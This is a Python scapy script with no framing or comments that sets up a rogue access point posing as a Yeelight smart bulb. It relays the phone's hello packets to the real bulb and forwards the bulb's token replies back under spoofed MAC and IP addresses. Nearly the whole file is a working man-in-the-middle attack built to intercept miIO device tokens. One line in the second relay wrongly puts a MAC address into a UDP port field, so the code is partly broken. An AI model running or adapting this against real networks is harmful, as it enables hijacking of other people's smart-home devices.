from scapy.all import *

malicious_yeelight_iface = "wlx908d7820496c"
malicious_yeelight_ip = "192.168.13.1"
malicious_yeelight_mac = "78:11:dc:aa:53:32"
malicious_yeelight_sport = 54321

AP_iface = "wlp3s0"
AP_ip = get_if_addr(AP_iface)
AP_mac = get_if_hwaddr(AP_iface)
AP_sport = 4875

yeelight_ip = "192.168.13.1"
yeelight_mac = "78:11:dc:aa:53:32"
yeelight_dport = 54321

pkt_hello = sniff(count=1, iface=malicious_yeelight_iface, filter="udp and dst port 54321")
print(f"PKT Hello: {pkt_hello[0][Raw].load}")
phone_ip = pkt_hello[0][IP].src
phone_port = pkt_hello[0][UDP].sport
phone_mac = pkt_hello[0][Ether].src
pkt_hello_forward = pkt_hello[0]
pkt_hello_forward[Ether].dst = yeelight_mac
pkt_hello_forward[Ether].src = AP_mac
pkt_hello_forward[IP].dst = yeelight_ip
pkt_hello_forward[IP].src = AP_ip
del pkt_hello_forward[IP].chksum
pkt_hello_forward[UDP].dport = yeelight_dport
pkt_hello_forward[UDP].sport = AP_sport
del pkt_hello_forward[UDP].chksum
sendp(pkt_hello_forward, iface=AP_iface, verbose=False)
print("PKT Hello forwarded (yeelight)")

pkt_token = sniff(count=1, iface=AP_iface, filter="udp and src port 54321")
print(f"PKT Token: {pkt_token[0][Raw].load}")
pkt_token[0][Ether].dst = phone_mac
pkt_token[0][Ether].src = malicious_yeelight_mac
pkt_token[0][IP].dst = phone_ip
pkt_token[0][IP].src = malicious_yeelight_ip
pkt_token[0][UDP].dport = phone_port
pkt_token[0][UDP].sport = malicious_yeelight_sport
sendp(pkt_token[0], iface=malicious_yeelight_iface, verbose=False)
print("PKT Hello forwarded (phone)")

pkt_hello = sniff(count=1, iface=malicious_yeelight_iface, filter="udp and dst port 54321")
print(f"PKT Hello 2: {pkt_hello[0][Raw].load}")
pkt_hello[0][Ether].dst = yeelight_mac
pkt_hello[0][Ether].src = AP_mac
pkt_hello[0][IP].dst = yeelight_ip
pkt_hello[0][IP].src = AP_ip
pkt_hello[0][UDP].dport = yeelight_dport
pkt_hello[0][UDP].sport = AP_sport
sendp(pkt_hello[0], iface=AP_iface, verbose=False)
print("PKT Token 2 forwarded (yeelight)")

pkt_token = sniff(count=1, iface=AP_iface, filter="udp and src port 54321")
print(f"PKT Token 2: {pkt_token[0][Raw].load}")
pkt_token[0][Ether].dst = phone_mac
pkt_token[0][Ether].src = malicious_yeelight_mac
pkt_token[0][IP].dst = phone_ip
pkt_token[0][IP].src = malicious_yeelight_ip
pkt_token[0][UDP].dport = phone_mac
pkt_token[0][UDP].sport = malicious_yeelight_sport
sendp(pkt_token[0], iface=malicious_yeelight_iface, verbose=False)
print("PKT Token 2 forwarded (phone)")


# print(f"PKT Token: {pkt_token[0][Raw].load}")
# sendp(pkt_token, verbose=False)

# pkt_token_response = sniff(count=1, iface="wlx908d7820496c", filter="udp and dst port 54321")
# print(f"PKT Token Response: {pkt_token_response[0][Raw].load}")

# print(f"PKT Token 2: {pkt_token[0][Raw].load}")
# sendp(pkt_token, verbose=False)

# pkt_token_response = sniff(count=1, iface="wlx908d7820496c", filter="udp and dst port 54321")
# print(f"PKT Token Response 2: {pkt_token_response[0][Raw].load}")